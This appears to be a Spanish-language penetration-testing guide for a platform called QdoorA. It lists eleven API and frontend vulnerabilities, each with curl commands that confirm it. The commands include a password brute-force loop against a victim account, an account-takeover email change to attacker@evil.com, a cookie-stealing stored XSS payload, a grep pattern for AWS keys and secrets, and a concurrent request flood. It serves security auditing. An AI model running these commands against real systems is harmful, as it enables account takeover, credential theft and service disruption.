# Vectores QdoorA — Guía de Detección Activa

> Guía de vectores prioritarios recopilados de auditorías de caja gris y pentests sobre sistemas modernos multientorno.
> Usa este archivo al iniciar CUALQUIER auditoría sobre el stack de QdoorA.

---

## QD-01 — Client-Side Authorization Bypass
**Riesgo**: El frontend de Angular lee roles/permisos desde `localStorage` o del response del login. Un atacante intercepta la respuesta HTTP con un proxy local (ej. Burp Suite Match & Replace) -> modifica los privilegios del JSON de respuesta (ej. `is_admin` o `role` a "admin") -> eleva sus privilegios client-side y visualiza paneles administrativos sin validación server-side.

**Test de confirmación:**
```bash
# 1. Login con un usuario de bajo privilegio (operador)
TOKEN=$(curl -s -X POST https://api.qdoora.cl/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"email":"operador@qdoora.cl","password":"Pass1234!"}' | jq -r '.token')

# 2. Con un proxy local o consola del navegador:
#    Match:   "role":"operador"
#    Replace: "role":"admin"
#    Match:   "is_admin":false
#    Replace: "is_admin":true
# 3. Navegar a paneles de administración en Angular.
# Si el frontend permite el acceso y renderiza el menú sin bloquear la navegación → QD-01 CONFIRMADO
```

**Criterio de fallo**: La lógica de control de acceso está parcialmente implementada en el cliente en lugar de ser forzada estrictamente en el backend.

---

## QD-02 — Credentials en Endpoint de Parámetros
**Riesgo**: Endpoint de variables globales o configuraciones del sistema (p.ej. `/api/v1/parametros`, `/api/v1/global-variables`) expone en texto plano credenciales altamente sensibles de infraestructura (ej. claves AWS IAM con permisos de lectura/escritura en S3, credenciales SMTP de Gmail corporativo, ActiveMQ o API keys de servicios externos).

**Test de confirmación:**
```bash
# Consultar endpoints de parámetros con token de bajo privilegio
curl -H "Authorization: Bearer $TOKEN" https://api.qdoora.cl/api/v1/parametros | \
  jq 'to_entries[] | select(.value | type == "string" and (test("AKIA|smtp|password|secret|key|aws"; "i")))'

# Si responde con credenciales operativas en texto plano → QD-02 CONFIRMADO
```

---

## QD-03 — Account Takeover Chain (ATO)
**Riesgo**: Cadena de explotación en tres fases que permite la apropiación total de cualquier cuenta:
1. **Fuga en listado de usuarios:** `/api/v1/users` expone emails, nombres y logins a roles no autorizados.
2. **Ausencia de Rate Limiting:** Facilidad para realizar brute force sobre `/api/v1/login`.
3. **Cambio de Email Inseguro:** El endpoint `PUT /api/v1/profile/email` no solicita la contraseña actual (`current_password`), permitiendo a un atacante cambiar el correo y secuestrar la cuenta mediante el flujo de recuperación de contraseña.

**Paso 1 — Enumeración de usuarios:**
```bash
# Consultar listado completo de usuarios registrados con token básico
curl -H "Authorization: Bearer $TOKEN" https://api.qdoora.cl/api/v1/users | jq '[.data[] | {email, id, role}]'
# Si un usuario de bajo privilegio puede ver esta lista → QD-03 paso 1 CONFIRMADO
```

**Paso 2 — Fuerza bruta sobre endpoint de autenticación:**
```bash
# Iterar logins comunes sin que la API bloquee por intentos consecutivos (429)
for pass in Password123 Admin123 Qdoora2026!; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://api.qdoora.cl/api/v1/login \
    -d "{\"email\":\"victima@qdoora.cl\",\"password\":\"$pass\"}")
  echo "Intento con contraseña '$pass' -> HTTP $STATUS"
done
# Si realiza múltiples intentos fallidos sin bloqueo temporal → QD-08 + QD-03 paso 2 CONFIRMADO
```

**Paso 3 — Modificación de email sin re-autenticación:**
```bash
curl -X PUT https://api.qdoora.cl/api/v1/profile/email \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'
# Si responde 200 sin exigir confirmación de password actual → QD-03 paso 3 CONFIRMADO
```

---

## QD-04 — BFLA (Broken Function Level Authorization)
**Riesgo**: El controlador en el backend no implementa políticas de autorización robustas (`Gate::authorize()` o middleware por rol). Un atacante con un token válido de bajo nivel puede consumir directamente los endpoints administrativos (creación de recursos, parametrización, eliminación de registros) bypassando la restricción visual del frontend.

**Test de confirmación:**
```bash
# Replicar peticiones privilegiadas con token de bajo privilegio
curl -X POST https://api.qdoora.cl/api/v1/tipo-servicios \
  -H "Authorization: Bearer $OPERADOR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Servicio Hackeado"}'
# Si responde HTTP 201 Created → QD-04 CONFIRMADO
```

---

## QD-05 — IDOR/BOLA en Descarga de Archivos
**Riesgo**: Los endpoints de descargas y documentos en la nube (`/api/v1/file/{id}` o `/api/v1/documents/{id}`) emplean identificadores secuenciales enteros y devuelven URLs presignadas de S3 sin verificar la relación de propiedad o límites de multi-tenant entre el usuario autenticado y el recurso.

**Test de confirmación:**
```bash
# Autenticado como Empresa A, intentar descargar un ID secuencial ajeno
curl -s -I -H "Authorization: Bearer $TOKEN_EMPRESA_A" \
  "https://api.qdoora.cl/api/v1/file/145" 
# Si responde 200 OK devolviendo la URL temporal de S3 de otra empresa → QD-05 CONFIRMADO

# Verificar si las URLs temporales generadas tienen una expiración excesiva (> 10 min)
PRESIGNED_URL=$(curl -s -H "Authorization: Bearer $TOKEN" "https://api.qdoora.cl/api/v1/file/10" | jq -r '.url')
# Reintentar acceder pasados 15 minutos. Si responde 200 OK → Expiración insegura CONFIRMADA
```

---

## QD-06 — Cross-Portal Privilege Escalation
**Riesgo**: Coexistencia de múltiples portales (Portal Clientes en Angular 18 y Portal de Soporte/Admin en Angular 21) compartiendo el mismo backend. Si no hay middleware de validación del scope del JWT (`portal.scope`), un token emitido para el Portal Clientes puede consumir endpoints exclusivos de la API de Soporte o Administración.

**Test de confirmación:**
```bash
# Intentar rutas reservadas a Soporte con token de Cliente
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $CLIENTE_TOKEN" \
  "https://api.qdoora.cl/api/v1/support/tickets"
# Si responde 200 OK → QD-06 CONFIRMADO
```

---

## QD-07 — Stored XSS via [innerHTML]
**Riesgo**: El backend almacena strings de texto libre directo en PostgreSQL sin sanitizar. Posteriormente, el frontend de Angular renderiza dicho valor usando la directiva `[innerHTML]` sin saneamiento (`DomSanitizer`), lo que permite ejecutar scripts maliciosos de forma persistente en los navegadores de todos los usuarios que visualicen grillas, historiales o paneles.

**Test de confirmación:**
```bash
# Inyectar payload JavaScript en un campo CRUD (ej. nombre de empresa o notificación)
curl -X POST https://api.qdoora.cl/api/v1/companies \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"<img src=x onerror=alert(document.cookie)>", "rut":"12345678-9"}'

# Consultar el listado
curl -H "Authorization: Bearer $TOKEN" https://api.qdoora.cl/api/v1/companies | grep -o '<img'
# Si el payload se devuelve intacto sin sanitización → QD-07 CONFIRMADO
```

---

## QD-08 — Rate Limiting Ausente en Operaciones Críticas
**Riesgo**: Ausencia de límites de frecuencia en rutas críticas (ej. `/login`, password resets, generación masiva de PDFs/DTEs, disparos de correos masivos), lo que abre la puerta a ataques de Denegación de Servicio (DoS), consumo masivo de memoria del servidor o DoS financiero (facturación en APIs de pago).

**Test de confirmación:**
```bash
# Ejecutar peticiones concurrentes de generación de PDF
for i in {1..20}; do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST \
    "https://api.qdoora.cl/api/v1/liquidaciones/10/pdf" \
    -H "Authorization: Bearer $TOKEN" &
done; wait
# Si todas responden 200 sin retornar 429 Too Many Requests → QD-08 CONFIRMADO
```

---

## QD-09 — Login Response Expone Objeto de Permisos
**Riesgo**: El endpoint de login devuelve en el body JSON toda la estructura de permisos y privilegios detallada del usuario (`permissions`, `roles`, `is_admin`). Un atacante intercepta y modifica estas propiedades locales a nivel de cliente para habilitar vistas restringidas de administración.

**Test de confirmación:**
```bash
curl -s -X POST https://api.qdoora.cl/api/v1/login \
  -d '{"email":"operador@qdoora.cl","password":"Pass"}' | \
  jq '{permissions: .permissions, roles: .roles, is_admin: .is_admin}'
# Si responde exponiendo los objetos completos de autorización → QD-09 CONFIRMADO
```

---

## QD-10 — APP_DEBUG en Entornos de Producción y QA
**Riesgo**: El servidor expone stack traces verbosos con información de la arquitectura interna de Express/Laravel, consultas SQL sin sanitizar, rutas de archivos del servidor y librerías importadas al enviar peticiones erróneas (ej. un JSON malformado).

**Test de confirmación:**
```bash
# Enviar un cuerpo JSON malformado intencionalmente
curl -s -X POST https://api.qdoora.cl/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"email":' \
  | grep -i "stack\|trace\|line\|file"
# Si responde con el trace completo de la excepción interna → QD-10 CONFIRMADO
```

---

## QD-11 — HTML Injection en Generación de PDFs
**Riesgo**: Los campos de entrada aceptan y procesan código HTML arbitrario que el motor del servidor (ej. Dompdf, Snappy) interpreta y procesa directamente en el archivo PDF oficial final, facilitando ataques de suplantación de documentos con logotipos institucionales o inclusión de archivos locales (LFI).

**Test de confirmación:**
```bash
# Enviar payload HTML en parámetros del generador de PDF
curl -X POST https://api.qdoora.cl/api/v1/generarPdf \
  -H "Content-Type: application/json" \
  -d '{"htmlCode":"<h1>Injected</h1>"}'
# Si el PDF resultante renderiza el H1 → QD-11 CONFIRMADO
```
